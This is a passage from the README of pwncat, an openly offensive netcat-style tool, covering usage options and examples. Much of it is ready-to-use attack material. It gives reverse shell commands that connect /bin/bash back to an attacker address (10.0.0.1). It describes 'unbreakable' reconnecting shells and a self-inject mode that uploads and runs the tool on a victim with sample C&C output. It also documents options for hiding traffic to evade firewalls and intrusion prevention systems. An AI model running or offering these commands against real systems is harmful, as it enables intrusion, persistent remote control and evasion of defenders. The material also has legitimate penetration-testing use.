open, `pwncat` will close\\n\\nYou can emulate the `netcat` behaviour with `--no-shutdown` command line argument.\\n\\nHave a look at the following commands to better understand this behaviour:\\n\\n```bash\\n# [Valid HTTP request] Quits, web server keeps connection intact, but STDIN is EOF\\nprintf \\\"GET / HTTP/1.1\\\\n\\\\n\\\" | pwncat www.google.com 80\\n\\n# [Valid HTTP request] Does not quit, web server keeps connection intact, but STDIN is EOF\\nprintf \\\"GET / HTTP/1.1\\\\n\\\\n\\\" | pwncat www.google.com 80 --no-shutdown\\n```\\n\\n```bash\\n# [Invalid HTTP request] Quits, because the web server closes the connection and STDIN is EOF\\nprintf \\\"GET / \\\\n\\\\n\\\" | pwncat www.google.com 80\\n```\\n\\n```bash\\n# [TCP]\\n# Both instances will quit after successful file transfer.\\npwncat -l 4444 > output.txt\\npwncat localhost 4444 < input.txt\\n\\n# [TCP]\\n# Neither of both, client and server will quit after successful transfer\\n# and they will be stuck, waiting for more input or output.\\n# When exiting one (e.g.: via Ctrl+c), the other one will quit as well.\\npwncat -l 4444 --no-shutdown > output.txt\\npwncat localhost 4444 --no-shutdown < input.txt\\n```\\n\\nBe advised that it is not reliable to send files via UDP\\n```bash\\n# [UDP] (--no-shutdown has no effect, as this is the default behaviour in UDP)\\n# Neither of both, client and server will quit after successful transfer\\n# and they will be stuck, waiting for more input or output.\\n# When exiting one (e.g.: via Ctrl+c), the other one will still stay open in UDP mode.\\npwncat -u -l 4444 > output.txt\\npwncat -u localhost 4444 < input.txt\\n```\\n\\nThere are many ways to alter this default behaviour. Have a look at the [usage](#computer-usage)\\nsection for more advanced settings.\\n\\n\\n## :closed_book: Documentation\\n\\nDocumentation will evolve over time.\\n\\n* API docs can be found here: [pwncat.api.html](https://cytopia.github.io/pwncat/pwncat.api.html)\\n* Python type coverage can be found here: [pwncat.type.html](https://cytopia.github.io/pwncat/pwncat.type.html)\\n* HTML man page can be found here: [pwncat.man.html](https://cytopia.github.io/pwncat/pwncat.man.html)\\n* Raw man page can be found here: [pwncat.1](man/pwncat.1)\\n\\n\\n## :computer: Usage\\n\\n### Keys\\n\\n| Behaviour | ![Alt][Linux] | ![Alt][MacOS] | ![Alt][Windows] |\\n|----------------|---------------|---------------|-----------------|\\n| Quit (SIGINT) | <kbd>Ctrl</kbd>+<kbd>c</kbd> | <kbd>Ctrl</kbd>+<kbd>c</kbd> | <kbd>Ctrl</kbd>+<kbd>c</kbd> |\\n| Quit (SIGQUIT) | <kbd>Ctrl</kbd>+<kbd>\\\\\\\\</kbd> | ? | ? |\\n| Quit (SIGQUIT) | <kbd>Ctrl</kbd>+<kbd>4</kbd> | ? | ? |\\n| Quit STDIN<sup>[1]</sup> | <kbd>Ctrl</kbd>+<kbd>d</kbd> | <kbd>Ctrl</kbd>+<kbd>d</kbd> | <kbd>Ctrl</kbd>+<kbd>z</kbd> and <kbd>Ctrl</kbd>+<kbd>Enter</kbd> |\\n| Send (NL) | <kbd>Ctrl</kbd>+<kbd>j</kbd> | ? | ? |\\n| Send (EOL) | <kbd>Ctrl</kbd>+<kbd>m</kbd> | ? | ? |\\n| Send (EOL) | <kbd>Enter</kbd> | <kbd>Enter</kbd> | <kbd>Enter</kbd> |\\n\\n> <sup>[1] Only works when not using `--no-shutdown` and `--keep`. Will then shutdown it's socket for sending, signaling the remote end and EOF on its socket.</sup>\\n\\n[Linux]: https://raw.githubusercontent.com/cytopia/icons/master/64x64/linux.png \\\"Linux\\\"\\n[MacOS]: https://raw.githubusercontent.com/cytopia/icons/master/64x64/osx.png \\\"MacOS\\\"\\n[Windows]: https://raw.githubusercontent.com/cytopia/icons/master/64x64/windows.png \\\"Windows\\\"\\n\\n### Command line arguments\\n\\nType `pwncat -h` or click below to see all available options.\\n\\n<details>\\n <summary><strong>Click here to expand usage</strong></summary>\\n\\n```\\nusage: pwncat [options] hostname port\\n pwncat [options] -l [hostname] port\\n pwncat [options] -z hostname port\\n pwncat [options] -L [addr:]port hostname port\\n pwncat [options] -R addr:port hostname port\\n pwncat -V, --version\\n pwncat -h, --help\\n\\n\\nEnhanced and comptaible Netcat implementation written in Python (2 and 3) with\\nconnect, zero-i/o, listen and forward modes and techniques to detect and evade\\nfirewalls and intrusion detection/prevention systems.\\n\\nIf no mode arguments are specified, pwncat will run in connect mode and act as\\na client to connect to a remote endpoint. If the connection to the remote\\nendoint is lost, pwncat will quit. See options for how to automatically re-\\nconnect.\\n\\npositional arguments:\\n hostname Address to listen, forward, scan or connect to.\\n\\n port [All modes]\\n Single port to listen, forward or connect to.\\n [Zero-I/O mode]\\n Specify multiple ports to scan:\\n Via list: 4444,4445,4446\\n Via range: 4444-4446\\n Via incr: 4444+2\\n\\nmode arguments:\\n -l, --listen [Listen mode]:\\n Start a server and listen for incoming connections.\\n If using TCP and a connected client disconnects or the\\n connection is interrupted otherwise, the server will\\n quit. See -k/--keep-open to change this behaviour.\\n\\n -z, --zero [Zero-I/0 mode]:\\n Connect to a remote endpoint and report status only.\\n Used for port scanning.\\n See --banner for version detection.\\n\\n -L [addr:]port, --local [addr:]port\\n [Local forward mode]:\\n This mode will start a server and a client internally.\\n The internal server will listen locally on specified\\n addr/port (given by --local [addr:]port).\\n The server will then forward traffic to the internal\\n client which connects to another server specified by\\n hostname/port given via positional arguments.\\n (I.e.: proxies a remote service to a local address)\\n\\n -R addr:port, --remote addr:port\\n [Remote forward mode]:\\n This mode will start two clients internally. One is\\n connecting to the target and one is connecting to\\n another pwncat/netcat server you have started some-\\n where. Once connected, it will then proxy traffic\\n between you and the target.\\n This mode should be applied on machines that block\\n incoming traffic and only allow outbound.\\n The connection to your listening server is given by\\n -R/--remote addr:port and the connection to the\\n target machine via the positional arguments.\\n\\noptional arguments:\\n -e cmd, --exec cmd Execute shell command. Only for connect or listen mode.\\n\\n -C lf, --crlf lf Specify, 'lf', 'crlf' or 'cr' to always force replacing\\n line endings for input and outout accordingly. Specify\\n 'no' to completely remove any line feeds. By default\\n it will not replace anything and takes what is entered\\n (usually CRLF on Windows, LF on Linux and some times\\n CR on MacOS).\\n\\n -n, --nodns Do not resolve DNS.\\n\\n --send-on-eof Buffer data received on stdin until EOF and send\\n everything in one chunk.\\n\\n --no-shutdown Do not shutdown into half-duplex mode.\\n If this option is passed, pwncat won't invoke shutdown\\n on a socket after seeing EOF on stdin. This is provided\\n for backward-compatibility with OpenBSD netcat, which\\n exhibits this behavior.\\n\\n -v, --verbose Be verbose and print info to stderr. Use -v, -vv, -vvv\\n or -vvvv for more verbosity. The server performance will\\n decrease drastically if you use more than three times.\\n\\n --info type Show additional info about sockets, IPv4/6 or TCP opts\\n applied to the current socket connection. Valid\\n parameter are 'sock', 'ipv4', 'ipv6', 'tcp' or 'all'.\\n Note, you must at least be in INFO verbose mode in order\\n to see them (-vv).\\n\\n -c str, --color str Colored log output. Specify 'always', 'never' or 'auto'.\\n In 'auto' mode, color is displayed as long as the output\\n goes to a terminal. If it is piped into a file, color\\n will automatically be disabled. This mode also disables\\n color on Windows by default. (default: auto)\\n\\n --safe-word str All modes:\\n If pwncat is started with this argument, it will shut\\n down as soon as it receives the specified string. The\\n --keep-open (server) or --reconn (client) options will\\n be ignored and it won't listen again or reconnect to you.\\n Use a very unique string to not have it shut down\\n accidentally by other input.\\n\\nprotocol arguments:\\n -4 Only Use IPv4 (default: IPv4 and IPv6 dualstack).\\n\\n -6 Only Use IPv6 (default: IPv4 and IPv6 dualstack).\\n\\n -u, --udp Use UDP for the connection instead of TCP.\\n\\n -T str, --tos str Specifies IP Type of Service (ToS) for the connection.\\n Valid values are the tokens 'mincost', 'lowcost',\\n 'reliability', 'throughput' or 'lowdelay'.\\n\\n --http Connect / Listen mode (TCP and UDP):\\n Hide traffic in http packets to fool Firewalls/IDS/IPS.\\n\\n --https Connect / Listen mode (TCP and UDP):\\n Hide traffic in https packets to fool Firewalls/IDS/IPS.\\n\\n -H [str [str ...]], --header [str [str ...]]\\n Add HTTP headers to your request when using --http(s).\\n\\ncommand & control arguments:\\n --self-inject cmd:host:port[s]\\n Listen mode (TCP only):\\n If you are about to inject a reverse shell onto the\\n victim machine (via php, bash, nc, ncat or similar),\\n start your listening server with this argument.\\n This will then (as soon as the reverse shell connects)\\n automatically deploy and background-run an unbreakable\\n pwncat reverse shell onto the victim machine which then\\n also connects back to you with specified arguments.\\n Example: '--self-inject /bin/bash:10.0.0.1:4444'\\n It is also possible to launch multiple reverse shells by\\n specifying multiple ports.\\n Via list: --self-inject /bin/sh:10.0.0.1:4444,4445,4446\\n Via range: --self-inject /bin/sh:10.0.0.1:4444-4446\\n Via incr: --self-inject /bin/sh:10.0.0.1:4444+2\\n Note: this is currently an experimental feature and does\\n not work on Windows remote hosts yet.\\n\\npwncat scripting engine:\\n --script-send file All modes (TCP and UDP):\\n A Python scripting engine to define your own custom\\n transformer function which will be executed before\\n sending data to a remote endpoint. Your file must\\n contain the exact following function which will:\\n be applied as the transformer:\\n def transform(data, pse):\\n # NOTE: the function name must be 'transform'\\n # NOTE: the function param name must be 'data'\\n # NOTE: indentation must be 4 spaces\\n # ... your transformations goes here\\n return data\\n You can also define as many custom functions or classes\\n within this file, but ensure to prefix them uniquely to\\n not collide with pwncat's function or classes, as the\\n file will be called with exec().\\n\\n --script-recv file All modes (TCP and UDP):\\n A Python scripting engine to define your own custom\\n transformer function which will be executed after\\n receiving data from a remote endpoint. Your file must\\n contain the exact following function which will:\\n be applied as the transformer:\\n def transform(data, pse):\\n # NOTE: the function name must be 'transform'\\n # NOTE: the function param name must be 'data'\\n # NOTE: indentation must be 4 spaces\\n # ... your transformations goes here\\n return data\\n You can also define as many custom functions or classes\\n within this file, but ensure to prefix them uniquely to\\n not collide with pwncat's function or classes, as the\\n file will be called with exec().\\n\\nzero-i/o mode arguments:\\n --banner Zero-I/O (TCP and UDP):\\n Try banner grabbing during port scan.\\n\\nlisten mode arguments:\\n -k, --keep-open Listen mode (TCP only):\\n Re-accept new clients in listen mode after a client has\\n disconnected or the connection is unterrupted otherwise.\\n (default: server will quit after connection is gone)\\n\\n --rebind [x] Listen mode (TCP and UDP):\\n If the server is unable to bind, it will re-initialize\\n itself x many times before giving up. Omit the\\n quantifier to rebind endlessly or specify a positive\\n integer for how many times to rebind before giving up.\\n See --rebind-robin for an interesting use-case.\\n (default: fail after first unsuccessful try).\\n\\n --rebind-wait s Listen mode (TCP and UDP):\\n Wait x seconds between re-initialization. (default: 1)\\n\\n --rebind-robin port Listen mode (TCP and UDP):\\n If the server is unable to initialize (e.g: cannot bind\\n and --rebind is specified, it it will shuffle ports in\\n round-robin mode to bind to.\\n Use comma separated string such as '80,81,82,83', a range\\n of ports '80-83' or an increment '80+3'.\\n Set --rebind to at least the number of ports to probe +1\\n This option requires --rebind to be specified.\\n\\nconnect mode arguments:\\n --source-addr addr Specify source bind IP address for connect mode.\\n\\n --source-port port Specify source bind port for connect mode.\\n\\n --reconn [x] Connect mode (TCP and UDP):\\n If the remote server is not reachable or the connection\\n is interrupted, the client will connect again x many\\n times before giving up. Omit the quantifier to retry\\n endlessly or specify a positive integer for how many\\n times to retry before giving up.\\n (default: quit if the remote is not available or the\\n connection was interrupted)\\n This might be handy for stable TCP reverse shells ;-)\\n Note on UDP:\\n By default UDP does not know if it is connected, so\\n it will stop at the first port and assume it has a\\n connection. Consider using --udp-sconnect with this\\n option to make UDP aware of a successful connection.\\n\\n --reconn-wait s Connect mode (TCP and UDP):\\n Wait x seconds between re-connects. (default: 1)\\n\\n --reconn-robin port Connect mode (TCP and UDP):\\n If the remote server is not reachable or the connection\\n is interrupted and --reconn is specified, the client\\n will shuffle ports in round-robin mode to connect to.\\n Use comma separated string such as '80,81,82,83', a range\\n of ports '80-83' or an increment '80+3'.\\n Set --reconn to at least the number of ports to probe +1\\n This helps reverse shell to evade intrusiona prevention\\n systems that will cut your connection and block the\\n outbound port.\\n This is also useful in Connect or Zero-I/O mode to\\n figure out what outbound ports are allowed.\\n\\n --ping-init Connect mode (TCP and UDP):\\n UDP is a stateless protocol unlike TCP, so no hand-\\n shake communication takes place and the client just\\n sends data to a server without being \\\"accepted\\\" by\\n the server first.\\n This means a server waiting for an UDP client to\\n connect to, is unable to send any data to the client,\\n before the client hasn't send data first. The server\\n simply doesn't know the IP address before an initial\\n connect.\\n The --ping-init option instructs the client to send one\\n single initial ping packet to the server, so that it is\\n able to talk to the client.\\n This is a way to make a UDP reverse shell work.\\n See --ping-word for what char/string to send as initial\\n ping packet (default: '\\\\0')\\n\\n --ping-intvl s Connect mode (TCP and UDP):\\n Instruct the client to send ping intervalls every s sec.\\n This allows you to restart your UDP server and just wait\\n for the client to report back in. This might be handy\\n for stable UDP reverse shells ;-)\\n See --ping-word for what char/string to send as initial\\n ping packet (default: '\\\\0')\\n\\n --ping-word str Connect mode (TCP and UDP):\\n Change the default character '\\\\0' to use for upd ping.\\n Single character or strings are supported.\\n\\n --ping-robin port Connect mode (TCP and UDP):\\n Instruct the client to shuffle the specified ports in\\n round-robin mode for a remote server to ping.\\n This might be handy to scan outbound allowed ports.\\n Use comma separated string such as '80,81,82,83', a range\\n of ports '80-83' or an increment '80+3'.\\n Use --ping-intvl 0 to be faster.\\n\\n --udp-sconnect Connect mode (UDP only):\\n Emulating stateful behaviour for UDP connect phase by\\n sending an initial packet to the server to validate if\\n it is actually connected.\\n By default, UDP will simply issue a connect and is not\\n aware if it is really connected or not.\\n The default connect packet to be send is '\\\\0', you\\n can change this with --udp-sconnect-word.\\n\\n --udp-sconnect-word [str]\\n Connect mode (UDP only):\\n Change the the data to be send for UDP stateful connect\\n behaviour. Note you can also omit the string to send an\\n empty packet (EOF), but be aware that some servers such\\n as netcat will instantly quit upon receive of an EOF\\n packet.\\n The default is to send a null byte sting: '\\\\0'.\\n\\nmisc arguments:\\n -h, --help Show this help message and exit\\n -V, --version Show version information and exit\\n```\\n</details>\\n\\n\\n## :bulb: Examples\\n\\n### Upgrade your shell to interactive\\n<!--\\n<details>\\n <summary>Click to expand</summary>\\n-->\\n\\n> This is a universal advice and not only works with `pwncat`, but with all other common tools.\\n\\nWhen connected with a reverse or bind shell you'll notice that no interactive commands will work and\\nhitting <kbd>Ctrl</kbd>+<kbd>c</kbd> will terminate your session.\\nTo fix this, you'll need to attach it to a TTY (make it interactive). Here's how:\\n```bash\\npython3 -c 'import pty; pty.spawn(\\\"/bin/bash\\\")'\\n```\\n<kbd>Ctrl</kbd>+<kbd>z</kbd>\\n```bash\\n# get your current terminal size (rows and columns)\\nstty size\\n\\n# for bash/sh (enter raw mode and disable echo'ing)\\nstty raw -echo\\nfg\\n\\n# for zsh (enter raw mode and disable echo'ing)\\nstty raw -echo; fg\\n\\nreset\\nexport SHELL=bash\\nexport TERM=xterm\\nstty rows <num> columns <cols> # <num> and <cols> values found above by 'stty size'\\n```\\n> <sup>[1] [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#spawn-tty-shell)</sup>\\n\\n\\n### UDP reverse shell\\nWithout tricks a UDP reverse shell is not really possible. UDP is a stateless protocol compared to TCP and does not have a `connect()` method as TCP does.\\nIn TCP mode, the server will know the client IP and port, once the client issues a `connects()`.\\nIn UDP mode, as there is no `connect()`, the client simply sends data to an address/port without having to connect first.\\nTherefore, in UDP mode, the server will not be able to know the IP and port of the client and hence, cannot send data to it first.\\nThe only way to make this possible is to have the client send some sort of data to the server first, so that the server can see what IP/port has sent data to it.\\n\\n`pwncat` emulates the TCP `connect()` by having the client send a null byte to the server once or periodically via `--ping-intvl` or `--ping-init`.\\n\\n```bash\\n# The client\\n# --exec # Provide this executable\\n# --udp # Use UDP mode\\n# --ping-init # Send an initial null byte to the server\\npwncat --exec /bin/bash --udp --ping-init 10.0.0.1 4444\\n```\\n\\n\\n### Unbreakable TCP reverse shell\\nWhy unbreakable? Because it will keep coming back to you, even if you kill your listening server temporarily.\\nIn other words, the client will keep trying to connect to the specified server until success. If the connection is interrupted, it will keep trying again.\\n```bash\\n# The client\\n# --exec # Provide this executable\\n# --nodns # Keep the noise down and don't resolve hostnames\\n# -reconn # Automatically reconnect back to you indefinitely\\n# --reconn-wait # If connection is lost, connect back to you every 2 seconds\\n\\npwncat --exec /bin/bash --nodns --reconn --reconn-wait 2 10.0.0.1 4444\\n```\\n\\n### Unbreakable UDP reverse shell\\nWhy unbreakable? Because it will keep coming back to you, even if you kill your listening server temporarily.\\nIn other words, the client will keep sending null bytes to the server to constantly announce itself.\\n```bash\\n# The client\\n# --exec # Provide this executable\\n# --nodns # Keep the noise down and don't resolve hostnames\\n# --udp # Use UDP mode\\n# --ping-intvl # Ping the server every 2 seconds\\n\\npwncat --exec /bin/bash --nodns --udp --ping-intvl 2 10.0.0.1 4444\\n```\\n\\n### Self-injecting reverse shell\\n\\nLet's imagine you are able to create a very simple and unstable reverse shell from the target to\\nyour machine, such as a web shell via a PHP script or similar.\\nKnowing, that this will not persist very long or might break due to unstable network connection,\\nyou could use `pwncat` to hook into this connection and deploy itself unbreakably on the target - fully automated.\\n\\n<a href=\\\"https://www.youtube.com/watch?v=lN10hgl_Ts8&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2&t=0s\\\"><img width=\\\"400\\\" style=\\\"width:400px;\\\" src=\\\"docs/img/video01.png\\\" /></a>\\n\\n> [View on Youtube](https://www.youtube.com/watch?v=lN10hgl_Ts8&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2&t=0s)\\n\\nAll you have to do, is use `pwncat` as your local listener and start it with the `--self-inject`\\nswitch. As soon as the client (e.g.: the reverse web shell) connects to it, it will do a couple of things:\\n\\n1. Enumerate Python availability and versions on the target\\n2. Dump itself base64 encoded onto the target\\n3. Use the target's Python to decode itself.\\n4. Use the target's Python to start itself as an unbreakable reverse shell back to you\\n\\nOnce this is done, you can keep using the current connection or simply abandon it and start a new\\nlistener (yes, you don't need to start the listener before starting the reverse shell) to have\\nthe new `pwncat` client connect to you. The new listener also doesn't have to be `pwncat`, it can\\nalso be `netcat` or `ncat`.\\n\\nThe **`--self-inject`** switch:\\n```bash\\npwncat -l 4444 --self-inject <cmd>:<host>:<port>\\n```\\n\\n* `<cmd>`: This is the command to start on the target (like `-e`/`--exec`, so you want it to be `cmd.exe` or `/bin/bash`)\\n* `<host>`: This is for your local machine, the IP address to where the reverse shell shall connect back to\\n* `<port>`: This is for your local machine, the port on which the reverse shell shall connect back to\\n\\nSo imagine your Kali machine is 10.0.0.1. You instruct your webshell that you inject onto a Linux server to connect to you at port `4444`:\\n```bash\\n# Start this locally, before starting the reverse webshell\\npwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445\\n```\\nYou will then see something like this:\\n```\\n[PWNCAT CnC] Probing for: /bin/python\\n[PWNCAT CnC] Probing for: /bin/python2\\n[PWNCAT CnC] Probing for: /bin/python2.7\\n[PWNCAT CnC] Probing for: /bin/python3\\n[PWNCAT CnC] Probing for: /bin/python3.5\\n[PWNCAT CnC] Probing for: /bin/python3.6\\n[PWNCAT CnC] Probing for: /bin/python3.7\\n[PWNCAT CnC] Probing for: /bin/python3.8\\n[PWNCAT CnC] Probing for: /usr/bin/python\\n[PWNCAT CnC] Potential path: /usr/bin/python\\n[PWNCAT CnC] Found valid Python2 version: 2.7.16\\n[PWNCAT CnC] Creating tmpfile: /tmp/tmp3CJ8Us\\n[PWNCAT CnC] Creating tmpfile: /tmp/tmpgHg7YT\\n[PWNCAT CnC] Uploading: /home/cytopia/tmp/pwncat/bin/pwncat -> /tmp/tmpgHg7YT (3422/3422)\\n[PWNCAT CnC] Decoding: /tmp/tmpgHg7YT -> /tmp/tmp3CJ8Us\\nStarting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn --reconn-wait 1 10.0.0.1 4445 &\\n```\\nAnd you are set. You can now start another listener locally at `4445` (again, it will connect back to you endlessly, so it is not required to start the listener first).\\n```bash\\n# either netcat\\nnc -lp 4445\\n# or ncat\\nncat -l 4445\\n# or pwncat\\npwncat -l 4445\\n```\\n\\n### Unlimited self-injecting reverse shells\\n\\nInstead of just asking for a single self-injecting reverse shell, you can instruct `pwncat` to spawn as many unbreakable reverse shells connecting back to you as you desire.\\n\\n<a href=\\\"https://www.youtube.com/watch?v=VQyFoUG18WY&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2\\\"><img width=\\\"400\\\" style=\\\"width:400px;\\\" src=\\\"docs/img/video02.png\\\" /></a>\\n\\n> [View on Youtube](https://www.youtube.com/watch?v=VQyFoUG18WY&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2\\\")\\n\\nThe `--self-inject` argument allows you to not only define a single port, but also\\n\\n1. A comma separated list of ports: `4445,4446,4447,4448`\\n2. A range definition: `4446-4448`\\n3. An increment: `4445+3`\\n\\nIn order to spawn 4 reverse shells you would start your listener just as described above, but instead\\nof a single port, you define multiple:\\n\\n```bash\\n# Comma separated\\npwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445,4446,4447,4448\\n\\n# Range\\npwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445-4448\\n\\n# Increment\\npwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445+3\\n```\\nEach of the above three commands will achieve the same behaviour: spawning 4 reverse shells inside the target.\\nOnce the client connects, the output will look something like this:\\n\\n```\\n[PWNCAT CnC] Probing for: /bin/python\\n[PWNCAT CnC] Probing for: /bin/python2\\n[PWNCAT CnC] Probing for: /bin/python2.7\\n[PWNCAT CnC] Probing for: /bin/python3\\n[PWNCAT CnC] Probing for: /bin/python3.5\\n[PWNCAT CnC] Probing for: /bin/python3.6\\n[PWNCAT CnC] Probing for: /bin/python3.7\\n[PWNCAT CnC] Probing for: /bin/python3.8\\n[PWNCAT CnC] Probing for: /usr/bin/python\\n[PWNCAT CnC] Potential path: /usr/bin/python\\n[PWNCAT CnC] Found valid Python2 version: 2.7.16\\n[PWNCAT CnC] Creating tmpfile: /tmp/tmp3CJ8Us\\n[PWNCAT CnC] Creating tmpfile: /tmp/tmpgHg7YT\\n[PWNCAT CnC] Uploading: /home/cytopia/tmp/pwncat/bin/pwncat -> /tmp/tmpgHg7YT (3422/3422)\\n[PWNCAT CnC] Decoding: /tmp/tmpgHg7YT -> /tmp/tmp3CJ8Us\\nStarting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn --reconn-wait 1 10.0.0.1 4445 &\\nStarting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn --reconn-wait 1 10.0.0.1 4446 &\\nStarting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn --reconn-wait 1 10.0.0.1 4447 &\\nStarting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn --reconn-wait 1 10.0.0.1 4448 &\\n```\\n\\n### Logging\\n\\n> **Note:** Ensure you have a reverse shell that keeps coming back to you. This way you can always change your logging settings without loosing the shell.\\n\\n#### Log level and redirection\\n\\nIf you feel like, you can start a listener in full TRACE logging mode to figure out what's going on or simply to troubleshoot.\\nLog message are colored depending on their severity. Colors are automatically turned off, if stderr is not a pty, e.g.: if piping those to a file.\\nYou can also manually disable colored logging for terminal outputs via the `--color` switch.\\n```bash\\npwncat -vvvv -l 4444\\n```\\nYou will see (among all the gibberish) a TRACE message:\\n```bash\\n2020-05-11 08:40:57,927 DEBUG NetcatServer.receive(): 'Client connected: 127.0.0.1:46744'\\n2020-05-11 08:40:57,927 TRACE [STDIN] 1854:producer(): Command output: b'\\\\x1b[32m[0]\\\\x1b[0m\\\\r\\\\r\\\\n'\\n2020-05-11 08:40:57,927 TRACE [STDIN] 2047:run_action(): [STDIN] Producer received: '\\\\x1b[32m[0]\\\\x1b[0m\\\\r\\\\r\\\\n'\\n2020-05-11 08:40:57,927 DEBUG [STDIN] 815:send(): Trying to send 15 bytes to 127.0.0.1:46744\\n2020-05-11 08:40:57,927 TRACE [STDIN] 817:send(): Trying to send: b'\\\\x1b[32m[0]\\\\x1b[0m\\\\r\\\\r\\\\n'\\n2020-05-11 08:40:57,927 DEBUG [STDIN] 834:send(): Sent 15 bytes to 127.0.0.1:46744 (0 bytes remaining)\\n2020-05-11 08:40:57,928 TRACE [STDIN] 1852:producer(): Reading command output\\n```\\n\\nAs soon as you saw this on the listener, you can issue commands to the client.\\nAll the debug messages are also not necessary, so you can safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate\\nyour server and start it again in silent mode:\\n```bash\\npwncat -l 4444\\n```\\nNow wait a maximum a few seconds, depending at what interval the client comes back to you and voila, your session is now again without logs.\\n\\nHaving no info messages at all, is also sometimes not desirable. You might want to know what is going\\non behind the scences or? Safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate your server and redirect\\nthe notifications to a logfile:\\n```bash\\npwncat -l -vvv 4444 2> comm.txt\\n```\\nNow all you'll see in your terminal session are the actual command inputs and outputs.\\nIf you want to see what's going on behind the scene, open a second terminal window and tail\\nthe `comm.txt` file:\\n```bash\\n# View communication info\\ntail -fn50 comm.txt\\n\\n2020-05-11 08:40:57,927 DEBUG NetcatServer.receive(): 'Client connected: 127.0.0.1:46744'\\n2020-05-11 08:40:57,927 TRACE [STDIN] 1854:producer(): Command output: b'\\\\x1b[32m[0]\\\\x1b[0m\\\\r\\\\r\\\\n'\\n2020-05-11 08:40:57,927 TRACE [STDIN] 2047:run_action(): [STDIN] Producer received: '\\\\x1b[32m[0]\\\\x1b[0m\\\\r\\\\r\\\\n'\\n2020-05-11 08:40:57,927 DEBUG [STDIN] 815:send(): Trying to send 15 bytes to 127.0.0.1:46744\\n2020-05-11 08:40:57,927 TRACE [STDIN] 817:send(): Trying to send: b'\\\\x1b[32m[0]\\\\x1b[0m\\\\r\\\\r\\\\n'\\n2020-05-11 08:40:57,927 DEBUG [STDIN] 834:send(): Sent 15 bytes to 127.0.0.1:46744 (0 bytes remaining)\\n2020-05-11 08:40:57,928 TRACE [STDIN] 1852:producer(): Reading command output\\n```\\n\\n#### Socket information\\n\\nAnother useful feature is to display currently configured socket and network settings.\\nUse the `--info` switch with either `socket`, `ipv4`, `ipv6`, `tcp` or `all` to display all\\navailable settings.\\n\\n**Note:** In order to view those settings, you must at least be at `INFO` log level (`-vv`).\\n\\nAn example output in IPv4/TCP mode without any custom settings is shown below:\\n```\\nINFO: [bind-sock] Sock: SO_DEBUG: 0\\nINFO: [bind-sock] Sock: SO_ACCEPTCONN: 1\\nINFO: [bind-sock] Sock: SO_REUSEADDR: 1\\nINFO: [bind-sock] Sock: SO_KEEPALIVE: 0\\nINFO: [bind-sock] Sock: SO_DONTROUTE: 0\\nINFO: [bind-sock] Sock: SO_BROADCAST: 0\\nINFO: [bind-sock] Sock: SO_LINGER: 0\\nINFO: [bind-sock] Sock: SO_OOBINLINE: 0\\nINFO: [bind-sock] Sock: SO_REUSEPORT: 0\\nINFO: [bind-sock] Sock: SO_SNDBUF: 16384\\nINFO: [bind-sock] Sock: SO_RCVBUF: 131072\\nINFO: [bind-sock] Sock: SO_SNDLOWAT: 1\\nINFO: [bind-sock] Sock: SO_RCVLOWAT: 1\\nINFO: [bind-sock] Sock: SO_SNDTIMEO: 0\\nINFO: [bind-sock] Sock: SO_RCVTIMEO: 0\\nINFO: [bind-sock] Sock: SO_ERROR: 0\\nINFO: [bind-sock] Sock: SO_TYPE: 1\\nINFO: [bind-sock] Sock: SO_PASSCRED: 0\\nINFO: [bind-sock] Sock: SO_PEERCRED: 0\\nINFO: [bind-sock] Sock: SO_BINDTODEVICE: 0\\nINFO: [bind-sock] Sock: SO_PRIORITY: 0\\nINFO: [bind-sock] Sock: SO_MARK: 0\\nINFO: [bind-sock] IPv4: IP_OPTIONS: 0\\nINFO: [bind-sock] IPv4: IP_HDRINCL: 0\\nINFO: [bind-sock] IPv4: IP_TOS: 0\\nINFO: [bind-sock] IPv4: IP_TTL: 64\\nINFO: [bind-sock] IPv4: IP_RECVOPTS: 0\\nINFO: [bind-sock] IPv4: IP_RECVRETOPTS: 0\\nINFO: [bind-sock] IPv4: IP_RETOPTS: 0\\nINFO: [bind-sock] IPv4: IP_MULTICAST_IF: 0\\nINFO: [bind-sock] IPv4: IP_MULTICAST_TTL: 1\\nINFO: [bind-sock] IPv4: IP_MULTICAST_LOOP: 1\\nINFO: [bind-sock] IPv4: IP_DEFAULT_MULTICAST_TTL: 0\\nINFO: [bind-sock] IPv4: IP_DEFAULT_MULTICAST_LOOP: 0\\nINFO: [bind-sock] IPv4: IP_MAX_MEMBERSHIPS: 0\\nINFO: [bind-sock] IPv4: IP_TRANSPARENT: 0\\nINFO: [bind-sock] TCP: TCP_NODELAY: 0\\nINFO: [bind-sock] TCP: TCP_MAXSEG: 536\\nINFO: [bind-sock] TCP: TCP_CORK: 0\\nINFO: [bind-sock] TCP: TCP_KEEPIDLE: 7200\\nINFO: [bind-sock] TCP: TCP_KEEPINTVL: 75\\nINFO: [bind-sock] TCP: TCP_KEEPCNT: 9\\nINFO: [bind-sock] TCP: TCP_SYNCNT: 6\\nINFO: [bind-sock] TCP: TCP_LINGER2: 60\\nINFO: [bind-sock] TCP: TCP_DEFER_ACCEPT: 0\\nINFO: [bind-sock] TCP: TCP_WINDOW_CLAMP: 0\\nINFO: [bind-sock] TCP: TCP_INFO: 10\\nINFO: [bind-sock] TCP: TCP_QUICKACK: 1\\nINFO: [bind-sock] TCP: TCP_FASTOPEN: 0\\n```\\n\\n\\n<!--\\n</details>\\n-->\\n\\n### Port forwarding magic\\n\\n<!--\\n<details>\\n <summary>Click to 